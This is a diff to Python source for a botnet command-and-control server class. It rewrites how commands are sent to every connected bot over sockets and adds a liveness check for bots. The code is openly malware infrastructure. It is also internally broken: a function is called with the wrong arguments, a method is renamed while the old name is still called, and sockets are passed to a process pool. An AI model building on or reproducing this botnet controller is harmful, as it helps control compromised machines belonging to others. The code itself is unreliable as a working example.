@@ -1,4 +1,5 @@
 import threading
+import concurrent.futures
 
 import botnet_exceptions
 
@@ -18,17 +19,24 @@ class C2server():
         if not self.bots:
             raise NoBotsException()
 
-        # TODO: maybe use async and await every bot.execute_command()?
-        for bot in self.bots:
-            bot_thread = threading.Thread(command_bot, args=(command))
-            bot_thread.start()
+        with concurrent.futures.ProcessPoolExecutor() as executor:
+            futures = [executor.submit(self.command_bot, bot) for bot in self.bots]
+        results = [f.result() for f in futures]
 
-    def command_bot(self, command):
-        self.check_connection()
 
-    def check_connection(self, bot):
+    def command_bot(self, command, bot):
+        if not self.check_connection(bot):
+            return "Dead bot"
+
+        bot.sendall(str(command.commandId).encode())
+
+    def is_bot_alive(self, bot):
         try:
             bot.sendall(b"Are you alive?")
+            response = bot.recv(1024)
+            if response == b"":
+                return False
         # TODO: put in proper exception handling for dead socket
         except:
-            pass
+            return False
+        return True
